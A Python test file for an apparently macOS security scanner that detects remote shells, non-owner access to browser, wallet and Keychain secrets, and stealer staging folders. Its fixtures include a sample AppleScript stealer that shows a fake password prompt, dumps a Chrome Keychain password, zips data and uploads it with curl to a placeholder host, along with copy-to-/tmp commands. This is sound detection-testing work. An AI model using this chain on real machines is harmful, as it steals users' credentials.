"""Live attack evidence (envscan.live): remote shells, secret stores held open by non-owners, stealer staging –
synthetic process/file data plus harmless dummy processes started by the test itself. Temp folders are named
cerber-test-* so a running background protection ignores the fake stealer folders made here."""
from __future__ import annotations

import os
import socket
import subprocess
import sys
import tempfile
import time
import unittest
from unittest import mock

from cerber.correlate import correlate
from cerber.envscan import files as fl
from cerber.envscan import live as lv
from cerber.envscan import netwatch as nw
from cerber.envscan.model import Signal, combine
from cerber.core import Confidence

from tests.test_netwatch import FakeSign, items

HOME = "/Users/tester"
CHROME_DIR = f"{HOME}/Library/Application Support/Google/Chrome/Default"
LOGIN_DATA = f"{CHROME_DIR}/Login Data"
METAMASK = f"{CHROME_DIR}/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn/000003.log"
KEYCHAIN = f"{HOME}/Library/Keychains/login.keychain-db"
CHROME = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
EVIL = f"{HOME}/Library/Application Support/.syncd/updater"


def P(pid, exe, cmd=None, ppid=1, name=None):
    return {"pid": pid, "ppid": ppid, "exe": exe, "name": name or os.path.basename(exe), "cmdline": cmd or [exe],
            "create_time": 1000.0 + pid}


def origin_of_factory(table: dict):
    return lambda exe: {"trust": table.get(exe, "devid")}


def conn(fd, ip, port=4444, status="ESTABLISHED"):
    return {"fd": fd, "raddr": (ip, port), "laddr": ("192.168.1.5", 50000), "status": status, "type": 1}


class StoresTest(unittest.TestCase):
    def test_classification(self):
        self.assertEqual(lv.secret_store(LOGIN_DATA, HOME)["category"], "passwords")
        self.assertEqual(lv.secret_store(f"{CHROME_DIR}/Network/Cookies", HOME)["category"], "cookies")
        self.assertEqual(lv.secret_store(f"{CHROME_DIR}/Login Data-journal", HOME)["category"], "passwords")
        self.assertIn("MetaMask", lv.secret_store(METAMASK, HOME)["label"])
        self.assertEqual(lv.secret_store(KEYCHAIN, HOME)["category"], "keychain")
        self.assertEqual(lv.secret_store(f"{HOME}/Library/Application Support/Telegram Desktop/tdata/key_datas",
                                         HOME)["category"], "session")
        self.assertEqual(lv.secret_store(f"{HOME}/Library/Application Support/Firefox/Profiles/ab.default/key4.db",
                                         HOME)["category"], "passwords")
        self.assertTrue(lv.secret_store("/private/tmp/x7/Chrome/Login Data", HOME)["copy"])
        for p in (f"{CHROME_DIR}/History", f"{CHROME_DIR}/Bookmarks", f"{CHROME_DIR}/Preferences",
                  f"{CHROME_DIR}/Local Extension Settings/aaaabbbbccccddddeeeeffffgggghhhh/1.log",
                  f"{HOME}/Library/Application Support/Slack/Cookies", f"{HOME}/projekty/app/Login Data",
                  f"{HOME}/.mytool/logins.json"):
            self.assertIsNone(lv.secret_store(p, HOME), p)

    def test_owner(self):
        st = lv.secret_store(LOGIN_DATA, HOME)
        self.assertTrue(lv.owns(st, CHROME))
        self.assertTrue(lv.owns(st, "/Applications/Google Chrome.app/Contents/Frameworks/Google Chrome Framework."
                                    "framework/Helpers/Google Chrome Helper.app/Contents/MacOS/Google Chrome Helper"))
        self.assertFalse(lv.owns(st, EVIL))
        self.assertFalse(lv.owns(lv.secret_store(KEYCHAIN, HOME), CHROME))          # only Apple's securityd


class SubjectTest(unittest.TestCase):
    def test_kinds(self):
        self.assertEqual(lv.subject_of(P(1, EVIL), "untrusted", HOME)[0], "untrusted")
        self.assertIsNone(lv.subject_of(P(2, CHROME), "devid", HOME)[0])
        self.assertIsNone(lv.subject_of(P(3, "/usr/libexec/secd"), "apple", HOME)[0])
        self.assertEqual(lv.subject_of(P(4, "/bin/cp"), "apple", HOME)[0], "tool")
        self.assertIsNone(lv.subject_of(P(5, "/opt/homebrew/bin/restic"), "pkgmgr", HOME)[0])   # backup tool
        self.assertEqual(lv.subject_of(P(6, "/usr/bin/python3", ["python3", "-c", "x"]), None, HOME)[0], "inline")
        self.assertEqual(lv.subject_of(P(7, "/usr/bin/python3", ["python3", "/private/tmp/a.py"]), None, HOME)[0],
                         "odd_script")
        self.assertEqual(lv.subject_of(P(8, "/opt/homebrew/bin/node", ["node", f"{HOME}/projekty/x/node_modules/"
                                                                               "p/index.js"]), None, HOME)[0],
                         "dev_script")


    def test_macos_python_launcher_is_an_interpreter(self):
        """psutil reports Homebrew / Command Line Tools Python as …/Python.app/Contents/MacOS/Python."""
        from cerber.envscan.patterns import analyze_command, interpreter_of
        exe = "/opt/homebrew/Cellar/python@3.14/3.14.8/Frameworks/Python.framework/Versions/3.14/Resources/" \
              "Python.app/Contents/MacOS/Python"
        self.assertEqual(interpreter_of(exe), "python")
        self.assertEqual(analyze_command([exe, "/private/tmp/x.py"]).script, "/private/tmp/x.py")
        self.assertEqual(lv.subject_of(P(9, exe, [exe, "/private/tmp/x.py"]), "pkgmgr", HOME)[0], "odd_script")


class RemoteShellTest(unittest.TestCase):
    def test_interpreter_with_socket_stdio(self):
        sh = P(10, "/bin/bash", ["bash", "-i"])
        sigs = lv.remote_shell_signals(sh, [conn(0, "203.0.113.7"), conn(1, "203.0.113.7"), conn(2, "203.0.113.7")])
        self.assertEqual((sigs[0].score, sigs[0].confidence), (90, Confidence.HIGH))
        self.assertEqual(lv.confidence_of(combine(sigs)), "high")
        loop = lv.remote_shell_signals(sh, [conn(0, "127.0.0.1"), conn(1, "127.0.0.1")])
        self.assertEqual(lv.confidence_of(combine(loop)), "medium")

    def test_not_a_remote_shell(self):
        sh = P(11, "/bin/bash", ["bash", "-c", "</dev/tcp/example.org/80"])
        self.assertEqual(lv.remote_shell_signals(sh, [conn(0, "93.184.216.34", 80)]), [])        # port check
        self.assertEqual(lv.remote_shell_signals(sh, [conn(5, "93.184.216.34"), conn(6, "93.184.216.34")]), [])
        self.assertEqual(lv.remote_shell_signals(sh, [conn(0, "203.0.113.7", status="SYN_SENT"),
                                                      conn(1, "203.0.113.7", status="SYN_SENT")]), [])
        cat = P(12, "/bin/cat")
        self.assertEqual(lv.remote_shell_signals(cat, [conn(0, "203.0.113.7"), conn(1, "203.0.113.7")]), [])
        odd = lv.remote_shell_signals(P(13, EVIL), [conn(0, "203.0.113.7"), conn(1, "203.0.113.7")])
        self.assertEqual(odd[0].name.rsplit(".", 1)[-1], "SocketStdio")


class SweepTest(unittest.TestCase):
    def sweep(self, procs, opened: dict, trust: dict, is_ours=None):
        def fake_probe(pid, ct=None, files=True):
            self.probed.append(pid)
            return opened.get(pid, ([], []))
        self.probed: list[int] = []
        return lv.LiveSweep(HOME, origin_of_factory(trust), is_ours, recheck_s=60, probe_fn=fake_probe)

    def test_untrusted_program_with_browser_passwords(self):
        procs = {100: P(100, EVIL), 200: P(200, CHROME)}
        sw = self.sweep(procs, {100: ([LOGIN_DATA, METAMASK], []), 200: ([LOGIN_DATA], [])},
                        {EVIL: "untrusted", CHROME: "devid"})
        hits = sw.run(procs, now=0)
        self.assertEqual(self.probed, [100])                      # Chrome (Developer ID) is never looked at
        self.assertEqual(len(hits), 1)
        h = hits[0]
        self.assertEqual((h["pid"], h["attack"], h["target"]), (100, "credential_theft", EVIL))
        meta = lv.event_meta(h["signals"])
        self.assertEqual((meta["confidence"], meta["attack"]), ("high", "credential_theft"))
        self.assertTrue(meta["evidence"])
        self.assertEqual(sw.run(procs, now=1), [])                # reported once per process instance

    def test_dev_script_and_owner_stay_below_high(self):
        node = P(101, "/opt/homebrew/bin/node", ["node", f"{HOME}/projekty/x/node_modules/p/index.js"])
        procs = {101: node}
        sw = self.sweep(procs, {101: ([LOGIN_DATA, METAMASK, f"{CHROME_DIR}/Cookies"], [])}, {})
        h = sw.run(procs, now=0)[0]
        self.assertEqual(lv.event_meta(h["signals"])["confidence"], "medium")     # several stores: still not high
        thor = P(102, "/Applications/Chromium.app/Contents/MacOS/Chromium")         # ad-hoc build, own profile
        procs = {102: thor}
        sw = self.sweep(procs, {102: ([f"{HOME}/Library/Application Support/Chromium/Default/Login Data"], [])},
                        {thor["exe"]: "unknown"})
        self.assertEqual(sw.run(procs, now=0), [])

    def test_apple_tool_counts_only_when_driven_by_osascript(self):
        osa = P(300, "/usr/bin/osascript", ["osascript", "-e", "…"], ppid=1)
        cp = P(301, "/bin/cp", ["cp", LOGIN_DATA, "/tmp/x/"], ppid=300)
        zsh = P(310, "/bin/zsh", ["-zsh"], ppid=1)
        cp2 = P(311, "/bin/cp", ["cp", LOGIN_DATA, "/tmp/y/"], ppid=310)
        ditto = P(302, "/usr/bin/ditto", ["ditto", CHROME_DIR, "/tmp/x/"], ppid=300)
        procs = {300: osa, 301: cp, 302: ditto, 310: zsh, 311: cp2}
        sw = self.sweep(procs, {301: ([LOGIN_DATA], []), 302: ([LOGIN_DATA], []), 311: ([LOGIN_DATA], [])}, {})
        hits = sw.run(procs, now=0)
        self.assertEqual([h["pid"] for h in hits], [300])          # the AppleScript is the one to stop, once
        self.assertEqual(hits[0]["via_pid"], 301)
        self.assertEqual(lv.event_meta(hits[0]["signals"])["confidence"], "high")

    def test_remote_shell_hit_and_schedule(self):
        sh = P(400, "/bin/sh", ["sh"], ppid=401)
        dropper = P(401, "/private/tmp/.x/agent")
        procs = {400: sh, 401: dropper}
        sw = self.sweep(procs, {400: ([], [conn(0, "198.51.100.9"), conn(1, "198.51.100.9")])},
                        {dropper["exe"]: "untrusted"})
        hits = sw.run(procs, now=0)
        self.assertEqual([(h["pid"], h["attack"]) for h in hits], [(400, "remote_shell")])
        self.assertIn("agent", hits[0]["detail"])
        for t in (1, 2):
            sw.run(procs, now=t)
        n = len(self.probed)
        sw.run(procs, now=30)                                     # after three quick probes: every recheck_s
        self.assertEqual(len(self.probed), n)
        sw.run(procs, now=100)
        self.assertGreater(len(self.probed), n)

    def test_cerber_and_budget(self):
        procs = {500: P(500, EVIL)}
        sw = self.sweep(procs, {500: ([LOGIN_DATA], [])}, {EVIL: "untrusted"}, is_ours=lambda pid: True)
        self.assertEqual(sw.run(procs, now=0), [])
        self.assertEqual(self.probed, [])
        many = {i: P(i, f"/private/tmp/p{i}") for i in range(600, 700)}
        sw = self.sweep(many, {}, {p["exe"]: "untrusted" for p in many.values()})
        sw.max_probes = 10
        sw.run(many, now=0)
        self.assertEqual(len(self.probed), 10)

    def test_is_cerber_process(self):
        me = os.getpid()
        procs = {me: {"pid": me, "ppid": 1, "exe": list(lv._our_pythons())[0], "cmdline": ["python", "-m", "cerber",
                                                                                          "watch", "run"]},
                 me + 1: {"pid": me + 1, "ppid": me, "exe": "/bin/cp", "cmdline": ["cp"]}}
        self.assertTrue(lv.is_cerber_process(me + 1, procs))
        procs[me]["cmdline"] = ["python", "-m", "http.server"]
        self.assertFalse(lv.is_cerber_process(me + 1, procs))


class MetaTest(unittest.TestCase):
    def test_attack_tags(self):
        self.assertEqual(lv.attack_of([("Heur:Env.Live.Process", 50), ("Heur:Env.Process.AppleMasquerade", 50)]),
                         "masquerade")
        self.assertEqual(lv.attack_of([("Heur:Env.Process.DeletedExec", 5)]), None)          # weak: no tag
        self.assertEqual(lv.attack_of([("Heur:Env.Live.IocConnection", 85)]), "c2")
        self.assertEqual(lv.names_from_evidence(["Heur:X.Y [+40]: d :: e"]), [("Heur:X.Y", 40)])
        low = lv.event_meta([Signal("A", 40, Confidence.HIGH, "d")])
        self.assertEqual(low["confidence"], "medium")
        self.assertEqual(lv.event_meta(None)["confidence"], "low")


class ScriptRulesTest(unittest.TestCase):
    STEALER_OSA = ('set p to text returned of (display dialog "macOS needs your password" default answer "" with hidden '
                   'answer)\ndo shell script "security find-generic-password -wa Chrome > /tmp/k; '
                   'ditto -c -k /tmp/d /tmp/out.zip; curl -F f=@/tmp/out.zip https://example.invalid/u"')

    def test_osascript_inline_stealer(self):
        sigs = lv.script_signals(["osascript", "-e", self.STEALER_OSA], "T", HOME)
        # the rule tables belong to the static analyzers (they evolve): check the outcome, not rule names
        self.assertEqual(lv.attack_of([(s.name, s.score) for s in sigs]), "credential_theft", sigs)
        self.assertGreaterEqual(combine(sigs).score, 80)
        self.assertEqual(lv.confidence_of(combine(sigs)), "high")

    def test_benign_inline_code(self):
        self.assertEqual(lv.script_signals(["osascript", "-e", 'display notification "Gotowe"'], "T", HOME), [])
        self.assertEqual(lv.script_signals(["/bin/zsh", "-c", "security find-generic-password -s gh -w | head"],
                                           "T", HOME), [])            # dev habit: no full chain → nothing
        self.assertEqual(lv.script_signals(["/usr/bin/python3", "-c", "import json; print(1)"], "T", HOME), [])

    def test_odd_script_file(self):
        with tempfile.NamedTemporaryFile("w", prefix="cerber-test-", suffix=".sh", dir="/private/tmp",
                                         delete=False) as fh:
            fh.write("#!/bin/sh\n" + self.STEALER_OSA.replace('"', "") + "\n")
        try:
            sigs = lv.script_signals(["/bin/sh", fh.name], "T", HOME)
            self.assertTrue(any(s.score >= 25 for s in sigs), sigs)
        finally:
            os.remove(fh.name)


class StagingTest(unittest.TestCase):
    def _make(self, root, names):
        for n in names:
            p = os.path.join(root, n)
            os.makedirs(os.path.dirname(p), exist_ok=True)
            open(p, "w").close()

    def test_strict_mode(self):
        with tempfile.TemporaryDirectory(prefix="cerber-test-") as d:
            self._make(d, ["s1/Chrome/Login Data", "s1/Chrome/Cookies"])
            self.assertTrue(fl.stealer_artifacts(d, 4, "x"))
            self.assertEqual(fl.stealer_artifacts(d, 4, "x", strict=True), [])
            self._make(d, ["s1/Firefox/key4.db"])
            self.assertTrue(fl.stealer_artifacts(d, 4, "x", strict=True))
            self._make(d, ["s1/Chrome/Preferences", "s1/Firefox/prefs.js"])          # a real (automation) profile
            self.assertEqual(fl.stealer_artifacts(d, 4, "x"), [])


def make_live_watch(events: list, opened: dict, trust: dict, procs: dict) -> nw.NetWatch:
    with mock.patch.object(nw, "_ioc_lookup", return_value=lambda ip: None), mock.patch.object(nw.threading, "Thread"):
        w = nw.NetWatch(nw.EnvContext({"deep": True}), events.append, root_pid=None, guard=True)
    w.baseline = True
    w.home = HOME
    w.live.home = HOME
    w._sign = lambda exe: ("brak podpisu", FakeSign("unsigned")) if exe and "/Users/" in exe else ("Apple", None)
    w._origin = lambda exe: {"trust": trust.get(exe, "apple"), "label": ""}
    w.live.origin_of = w._origin
    w._is_cerber = lambda pid: False
    w.live.probe = lambda pid, ct=None, files=True: opened.get(pid, ([], []))
    w.procs = procs
    return w


class NetwatchLiveTest(unittest.TestCase):
    def test_guard_event_fields(self):
        events: list = []
        procs = {100: P(100, EVIL)}
        w = make_live_watch(events, {100: ([LOGIN_DATA, KEYCHAIN], [])}, {EVIL: "untrusted"}, procs)
        w._check_live()
        it = items(events)
        theft = [x for x in it if x.get("attack") == "credential_theft"]
        self.assertEqual(len(theft), 1, it)
        x = theft[0]
        self.assertEqual((x["confidence"], x["severity"], x["pid"], x["target"], x["trust"], x["ioc"]),
                         ("high", "malicious", 100, EVIL, "untrusted", False))
        self.assertTrue(x["evidence"] and x["signals"])
        w._check_live()
        self.assertEqual(len([x for x in items(events) if x.get("attack") == "credential_theft"]), 1)

    def test_ioc_and_interpreter_target(self):
        events: list = []
        w = make_live_watch(events, {}, {}, {})
        w.look = lambda ip: "ThreatFox.AMOS"
        with mock.patch.object(nw.os.path, "exists", return_value=True):
            w._check_connections([{"process": "python3", "pid": 77, "exe": "/usr/bin/python3",
                                   "remote": "203.0.113.66", "port": 443, "host": None, "state": "ESTABLISHED",
                                   "public": True, "ioc": None}], [], 0.0)
        x = items(events)[0]
        self.assertTrue(x["ioc"])
        self.assertEqual(x["confidence"], "high")
        self.assertIsNone(x["target"])                     # never Apple's python itself

    def test_staging_folder_appears(self):
        events: list = []
        w = make_live_watch(events, {}, {}, {})
        with tempfile.TemporaryDirectory(prefix="cerber-test-") as root:
            stage = os.path.join(root, "48213")
            for n in ("Chrome/Login Data", "Chrome/Cookies", "Brave/Login Data", "login.keychain-db"):
                p = os.path.join(stage, n)
                os.makedirs(os.path.dirname(p), exist_ok=True)
                open(p, "w").close()
            w._stage(stage, False, time.time())
            w._check_staging(time.time())
        it = [x for x in items(events) if x["kind"] == "file"]
        self.assertEqual(len(it), 1)
        self.assertEqual((it[0]["attack"], it[0]["confidence"], it[0]["target"]),
                         ("credential_theft", "high", stage))

    def test_tmpdir_noise_ignored(self):
        events: list = []
        w = make_live_watch(events, {}, {}, {})
        with tempfile.TemporaryDirectory(prefix="cerber-test-") as tmpd:
            w.staging_roots = [tmpd]
            w.staging_state = {tmpd: set()}
            prof = os.path.join(tmpd, "playwright_chromiumdev_profile-AbC", "Default")
            os.makedirs(prof)
            for n in ("Login Data", "Cookies", "Web Data"):
                open(os.path.join(prof, n), "w").close()
            w._check_staging(time.time())
        self.assertEqual(items(events), [])


class CorrelateLiveTest(unittest.TestCase):
    def finding(self, target, score=80):
        return {"category": "process", "title": "Dostęp do haseł", "location": "pid 9", "severity": "malicious",
                "detection": {"score": score, "evidence": [f"Heur:Env.Live.SecretAccess.Passwords [+{score}]: x"]},
                "details": {"pid": 9, "exe": target or "/usr/bin/python3", "target": target,
                            "attack": "credential_theft", "confidence": "high"}}

    def test_live_alone_is_a_case(self):
        env = {"inventory": {"processes": [{"exe": EVIL, "name": "updater", "pids": [9],
                                            "origin": {"path": EVIL, "trust": "untrusted", "exists": True}}]},
               "findings": [self.finding(EVIL)]}
        cor = correlate(env, {}, [], home=HOME)
        self.assertEqual(cor["cases"][0]["severity"], "malicious")

    def test_interpreter_without_script_is_not_a_unit(self):
        env = {"inventory": {"processes": []}, "findings": [self.finding(None)]}
        self.assertEqual(correlate(env, {}, [], home=HOME)["cases"], [])

    def test_monitor_event(self):
        net = {"monitor": {"events": [{"kind": "process", "severity": "malicious", "score": 90, "title": "t",
                                       "exe": "/bin/sh", "target": None, "attack": "remote_shell",
                                       "confidence": "high"},
                                      {"kind": "process", "severity": "malicious", "score": 85, "title": "t",
                                       "exe": EVIL, "target": EVIL, "attack": "credential_theft",
                                       "confidence": "high"}]}}
        cor = correlate({"inventory": {}, "findings": []}, net, [], home=HOME)
        self.assertEqual([c["exe"] for c in cor["cases"]], [EVIL])


class DummyProcessTest(unittest.TestCase):
    """Real (harmless) child processes of this test: probe() must see what they hold."""

    def test_open_store_is_seen(self):
        with tempfile.TemporaryDirectory(prefix="cerber-test-") as home:
            home = os.path.realpath(home)
            store = os.path.join(home, "Library/Application Support/Google/Chrome/Default/Login Data")
            os.makedirs(os.path.dirname(store))
            open(store, "w").close()
            child = subprocess.Popen([sys.executable, "-c", "import sys,time; f=open(sys.argv[1]); "
                                      "print('ok', flush=True); time.sleep(20)", store], stdout=subprocess.PIPE,
                                     text=True)
            try:
                self.assertEqual(child.stdout.readline().strip(), "ok")
                files, conns = lv.probe(child.pid)
                self.assertIn(store, [os.path.realpath(f) for f in files])
                info = P(child.pid, sys.executable, [sys.executable, "-c", "…"], ppid=os.getpid())
                sw = lv.LiveSweep(home, lambda exe: {"trust": "pkgmgr"})
                hits = sw.judge(child.pid, info, [os.path.realpath(f) for f in files], conns, {child.pid: info})
                self.assertEqual([h["attack"] for h in hits], ["credential_theft"])
            finally:
                child.kill()
                child.wait()
                child.stdout.close()

    def test_socket_stdio_is_seen(self):
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        cli = socket.create_connection(srv.getsockname())
        peer, _ = srv.accept()
        child = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(20)"], stdin=cli.fileno(),
                                 stdout=cli.fileno(), close_fds=True)
        try:
            deadline = time.time() + 5
            sigs = []
            while time.time() < deadline and not sigs:
                res = lv.probe(child.pid)
                if isinstance(res, tuple):
                    sigs = lv.remote_shell_signals(P(child.pid, sys.executable, ["python3"]), res[1])
                time.sleep(0.05)
            self.assertTrue(sigs)
            self.assertEqual(lv.confidence_of(combine(sigs)), "medium")       # loopback peer: medium only
        finally:
            child.kill()
            child.wait()
            for s in (cli, peer, srv):
                s.close()


if __name__ == "__main__":
    unittest.main()
